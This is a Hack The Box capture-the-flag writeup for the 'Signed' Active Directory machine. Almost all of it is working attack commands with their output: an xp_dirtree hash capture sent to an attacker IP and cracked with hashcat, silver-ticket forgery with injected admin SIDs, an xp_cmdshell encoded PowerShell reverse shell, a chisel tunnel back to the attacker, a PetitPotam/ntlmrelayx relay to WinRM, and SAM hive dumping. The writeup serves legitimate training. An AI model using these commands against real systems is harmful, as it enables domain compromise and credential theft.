---
title: "Signed Writeup - HTB Medium Active Directory Box"
date: 2026-02-09
categories: [HTB, Active Directory]
tags: [mssql, smb-relay, silver-ticket, winrm, credential-dumping]
author: el_mehdi_dridi
description: "Complete writeup for the Signed HTB machine - A medium difficulty Active Directory box involving MSSQL attacks and SMB to WinRM relay."
---

# Signed HTB Writeup

## Overview

Signed is a medium-difficulty Active Directory box created by kavigihan. It involves an MSSQL attack vector and SMB to WinRM attack relay. It contains 2 approaches: one intended and one unintended. This time we were provided with initial credentials `scott:Sm230#C5NatH`.

![Signed writeup pic](/assets/img/posts/signed/Screenshot%202026-02-09%20194804.png)

---

## Enumeration & Initial Access

The user scott has access to the MSSQL server.

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ nxc mssql SIGNED.HTB -u scott -p 'Sm230#C5NatH' --local-auth
MSSQL       10.129.185.236  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.185.236  1433   DC01             [+] DC01\scott:Sm230#C5NatH
```

Using `xp_dirtree` we successfully captured the NTLM hash of the `mssqlsvc` account.

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ mssqlclient.py signed.htb/scott:'Sm230#C5NatH'@10.129.185.236
SQL (scott  guest@master)> xp_dirtree \\10.10.14.8\fake\share
subdirectory   depth   file
------------   -----   ----
SQL (scott  guest@master)>
```

We captured the hash using Responder:

```bash
[SMB] NTLMv2-SSP Client   : 10.129.185.236
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:adfb7d5ec262ce68:7DA425FC64...
```

We successfully cracked it using hashcat. The password is `purPLE9795!@`.

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ hashcat -m 5600  hash.txt  /usr/share/wordlists/rockyou.txt --show
...
:purPLE9795!@
```

---

## Foothold: Silver Ticket Attack

We reconnected to MSSQL again with the `mssqlsvc` account.

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ mssqlclient.py signed.htb/mssqlsvc:'purPLE9795!@'@10.129.185.236 -windows-auth
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SNAME() AS login_name, master.dbo.fn_varbintohexstr(SUSER_SID()) AS sid_hex
login_name        sid_hex
---------------   ----------------------------------------------------------
SIGNED\mssqlsvc   0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
```

We decoded the SID to find the domain SID:
`S-1-5-21-4088429403-1159899800-2753317549`

Enumerating permissions, we found that the `IT` group (RID 1105) exists. Since we have access to `mssqlsvc` (which runs the service), we used a **Silver Ticket** attack to target the `IT` group.

First, we generate the MD4 hash of the service password:

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ iconv -f ASCII -t UTF-16LE <(printf 'purPLE9795!@') | openssl dgst -md4
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```

Then we forge the ticket:

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/dc01.signed.htb:1433 IT -dc-ip 10.129.69.137 -groups 1105
...
[*] Saving ticket in IT.ccache

┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ export KRB5CCNAME=IT.ccache
```

After obtaining the ticket, we authenticated and enabled `xp_cmdshell` to get a reverse shell.

```python
SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "powershell -ec JABjAGwAaQBl..."
```

We received the connection and read the user flag.

```bash
PS C:\users> type mssqlsvc\Desktop\user.txt
d4f86c00e205ab397bcfe7d40509749a
```

---

## Unintended Solution (Privilege Escalation)

For the unintended solution, we injected the **Domain Admin** and **Enterprise Admin** SIDs into our Silver Ticket. This allowed us to gain full admin access directly.

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/dc01.signed.htb:1433 mssqlsvc -dc-ip 10.129.185.236  -groups 519,1105 -user-id 1103
```

Connecting with this ticket gave us `dbo` access to the master database, allowing us to read the root flag directly via SQL commands.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> Create database flag
SQL (SIGNED\mssqlsvc  dbo@master)> use flag
SQL (SIGNED\mssqlsvc  dbo@flag)> create table flag(content varchar(1000))
SQL (SIGNED\mssqlsvc  dbo@flag)> bulk insert dbo.flag from 'C:\users\administrator\desktop\root.txt'
SQL (SIGNED\mssqlsvc  dbo@flag)> select * from flag
content
-----------------------------------
b'5fefb56476dfd0778999e70d806cacc6'
```

---

## Intended Solution (Root)

The machine name `Signed` was a hint to focus on protocol signing.

### Tunneling with Chisel

We used Chisel to forward the internal network to our localhost to interact with internal ports.

```bash
# Server (Kali)
./chisel server --socks5 --reverse

# Client (Target)
.\chisel.exe client --fingerprint <fingerprint> 10.10.14.8:8080 R:socks
```

### NTLM Relay Attack

We used `NetExec` (nxc) to check for NTLM reflection vulnerabilities.

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ proxychains nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M ntlm_reflection
NTLM_REF... 224.0.0.1       445    DC01             VULNERABLE (can relay SMB to other protocols except SMB on 224.0.0.1)
```

The target is vulnerable to relaying SMB to other protocols. We performed an **NTLM Reflection Attack (SMB to WinRM)**.

1.  **Add DNS Record:**
    ```bash
    proxychains python3 dnstool.py -u 'SIGNED.HTB\mssqlsvc' -p 'purPLE9795!@' 10.129.185.236 -a add -r localhost... -d 10.10.14.8
    ```

2.  **Trigger Authentication (PetitPotam):**
    ```bash
    proxychains python3 PetitPotam.py -u 'mssqlsvc' -p 'purPLE9795!@' localhost... 10.129.185.236
    ```

3.  **Relay to WinRM:**
    ```bash
    proxychains ntlmrelayx.py -t winrms://DC01.SIGNED.HTB -smb2support
    ```

The relay was successful, and we received an interactive WinRM shell on port `11001`.

```bash
[*] winrms:///@dc01.signed.htb [2] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11001
```

### Root Flag & Credential Dumping

Connecting to the relayed shell gave us System access.

```bash
┌──(idh4m㉿Kali)-[~/Desktop/htb/Signed]
└─$ rlwrap nc 127.0.0.1 11001
# TYPE c:\Users\Administrator\Desktop\root.txt
5fefb56476dfd0778999e70d806cacc6
```

Finally, we dumped the SAM and SYSTEM hives to extract hashes.

```cmd
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

Retrieving and dumping secrets:

```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d5841be5e81a414505cc1e867284c6e:::
```

---

**Report Generated:** February 9, 2026  
**Author:** El Mehdi Dridi  
**Challenge:** Signed - Hack The Box

---

This is my first official writeup, I hope you enjoyed reading this!

*Feel free to reach out on [Twitter/X](https://x.com/1DH4M_Tun) if you have any questions!*
